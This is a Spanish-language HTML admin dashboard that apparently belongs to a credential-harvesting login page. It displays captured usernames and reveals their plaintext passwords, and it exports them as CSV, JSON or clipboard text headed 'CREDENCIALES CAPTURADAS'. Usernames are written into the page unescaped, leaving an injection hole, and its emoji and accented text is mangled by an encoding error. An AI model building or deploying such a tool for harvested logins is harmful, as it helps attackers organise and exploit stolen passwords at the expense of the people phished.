<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Panel Admin - Credenciales</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #1a1a1a;
            color: #333;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.2);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .header h1 {
            font-size: 24px;
        }
        
        .stats {
            background: rgba(255,255,255,0.2);
            padding: 8px 15px;
            border-radius: 20px;
            font-size: 14px;
        }
        
        .toolbar {
            padding: 20px;
            background: #f5f5f5;
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        
        button {
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-weight: 600;
            transition: all 0.3s;
        }
        
        .btn-primary {
            background: #667eea;
            color: white;
        }
        
        .btn-primary:hover {
            background: #5a6fd6;
            transform: translateY(-2px);
        }
        
        .btn-danger {
            background: #dc3545;
            color: white;
        }
        
        .btn-danger:hover {
            background: #c82333;
        }
        
        .btn-success {
            background: #28a745;
            color: white;
        }
        
        .btn-success:hover {
            background: #218838;
        }
        
        .table-container {
            padding: 20px;
            overflow-x: auto;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 10px;
        }
        
        th {
            background: #667eea;
            color: white;
            padding: 12px;
            text-align: left;
            font-size: 14px;
        }
        
        td {
            padding: 12px;
            border-bottom: 1px solid #ddd;
            font-size: 14px;
        }
        
        tr:hover {
            background: #f5f5f5;
        }
        
        .badge {
            background: #28a745;
            color: white;
            padding: 3px 8px;
            border-radius: 12px;
            font-size: 12px;
        }
        
        .empty-state {
            text-align: center;
            padding: 50px;
            color: #999;
        }
        
        .export-section {
            margin-left: auto;
            display: flex;
            gap: 10px;
        }
        
        .password-masked {
            font-family: monospace;
            color: #666;
        }
        
        .footer {
            padding: 20px;
            background: #f5f5f5;
            text-align: center;
            color: #666;
            font-size: 13px;
            border-top: 1px solid #ddd;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>üìä Panel de Administraci√≥n - Credenciales</h1>
            <div class="stats" id="stats">Cargando...</div>
        </div>
        
        <div class="toolbar">
            <button class="btn-primary" onclick="cargarDatos()">üîÑ Actualizar</button>
            <button class="btn-success" onclick="exportarCSV()">üì• Exportar CSV</button>
            <button class="btn-success" onclick="exportarJSON()">üìã Exportar JSON</button>
            <button class="btn-danger" onclick="limpiarDatos()">üóëÔ∏è Limpiar todo</button>
            <div class="export-section">
                <button class="btn-primary" onclick="copiarAlPortapapeles()">üìã Copiar como texto</button>
            </div>
        </div>
        
        <div class="table-container">
            <table id="tablaCredenciales">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Usuario/Email</th>
                        <th>Contrase√±a</th>
                        <th>Fecha y Hora</th>
                        <th>Navegador</th>
                        <th>Acciones</th>
                    </tr>
                </thead>
                <tbody id="tablaBody">
                    <tr>
                        <td colspan="6" class="empty-state">
                            No hay credenciales guardadas a√∫n.<br>
                            <small>Esperando datos del formulario de login...</small>
                        </td>
                    </tr>
                </tbody>
            </table>
        </div>
        
        <div class="footer">
            ‚ö†Ô∏è Estos datos se almacenan LOCALMENTE en tu navegador. Solo t√∫ puedes verlos.
        </div>
    </div>
    
    <script>
        function cargarDatos() {
            const tbody = document.getElementById('tablaBody');
            const logins = JSON.parse(localStorage.getItem('logins') || '[]');
            const stats = document.getElementById('stats');
            
            stats.innerHTML = `üìå Total: ${logins.length} credenciales`;
            
            if (logins.length === 0) {
                tbody.innerHTML = `
                    <tr>
                        <td colspan="6" class="empty-state">
                            No hay credenciales guardadas a√∫n.<br>
                            <small>Esperando datos del formulario de login...</small>
                        </td>
                    </tr>
                `;
                return;
            }
            
            let html = '';
            logins.reverse().forEach((login, index) => {
                const fecha = new Date(login.timestamp).toLocaleString('es-ES', {
                    year: 'numeric',
                    month: '2-digit',
                    day: '2-digit',
                    hour: '2-digit',
                    minute: '2-digit',
                    second: '2-digit'
                });
                
                html += `
                    <tr>
                        <td>${index + 1}</td>
                        <td><strong>${login.username || 'N/A'}</strong></td>
                        <td class="password-masked">‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢ (${login.password?.length || 0} chars)</td>
                        <td>${fecha}</td>
                        <td><span class="badge">${login.userAgent?.substring(0, 30) || 'Desconocido'}...</span></td>
                        <td>
                            <button onclick="verDetalle(${index})" style="padding: 3px 8px; background: #17a2b8;">üëÅÔ∏è Ver</button>
                            <button onclick="eliminarItem(${index})" style="padding: 3px 8px; background: #dc3545;">üóëÔ∏è</button>
                        </td>
                    </tr>
                `;
            });
            
            tbody.innerHTML = html;
        }
        
        function verDetalle(index) {
            const logins = JSON.parse(localStorage.getItem('logins') || '[]');
            const login = logins.reverse()[index];
            
            alert(`
üìß Usuario: ${login.username}
üîë Contrase√±a: ${login.password}
üìÖ Fecha: ${new Date(login.timestamp).toLocaleString()}
üåê Navegador: ${login.userAgent}
            `);
        }
        
        function eliminarItem(index) {
            if (confirm('¬øEliminar esta entrada?')) {
                let logins = JSON.parse(localStorage.getItem('logins') || '[]');
                logins = logins.reverse();
                logins.splice(index, 1);
                logins.reverse();
                localStorage.setItem('logins', JSON.stringify(logins));
                cargarDatos();
            }
        }
        
        function exportarCSV() {
            const logins = JSON.parse(localStorage.getItem('logins') || '[]');
            if (logins.length === 0) {
                alert('No hay datos para exportar');
                return;
            }
            
            let csv = 'Usuario,Contrase√±a,Fecha,Navegador\n';
            logins.forEach(login => {
                csv += `"${login.username}","${login.password}","${login.timestamp}","${login.userAgent}"\n`;
            });
            
            const blob = new Blob([csv], { type: 'text/csv' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `credenciales_${new Date().toISOString().split('T')[0]}.csv`;
            a.click();
        }
        
        function exportarJSON() {
            const logins = JSON.parse(localStorage.getItem('logins') || '[]');
            if (logins.length === 0) {
                alert('No hay datos para exportar');
                return;
            }
            
            const blob = new Blob([JSON.stringify(logins, null, 2)], { type: 'application/json' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `credenciales_${new Date().toISOString().split('T')[0]}.json`;
            a.click();
        }
        
        function copiarAlPortapapeles() {
            const logins = JSON.parse(localStorage.getItem('logins') || '[]');
            if (logins.length === 0) {
                alert('No hay datos para copiar');
                return;
            }
            
            let texto = 'CREDENCIALES CAPTURADAS\n';
            texto += '='.repeat(50) + '\n\n';
            
            logins.forEach((login, index) => {
                texto += `[${index + 1}] Usuario: ${login.username}\n`;
                texto += `    Contrase√±a: ${login.password}\n`;
                texto += `    Fecha: ${new Date(login.timestamp).toLocaleString()}\n`;
                texto += `    Navegador: ${login.userAgent}\n`;
                texto += '-'.repeat(40) + '\n';
            });
            
            navigator.clipboard.writeText(texto).then(() => {
                alert('‚úÖ Datos copiados al portapapeles');
            });
        }
        
        function limpiarDatos() {
            if (confirm('‚ö†Ô∏è ¬øEst√°s seguro de eliminar TODAS las credenciales?')) {
                localStorage.removeItem('logins');
                cargarDatos();
            }
        }
        
        // Cargar datos autom√°ticamente al abrir la p√°gina
        window.onload = cargarDatos;
        
        // Actualizar cada 30 segundos
        setInterval(cargarDatos, 30000);
    </script>
</body>
</html>
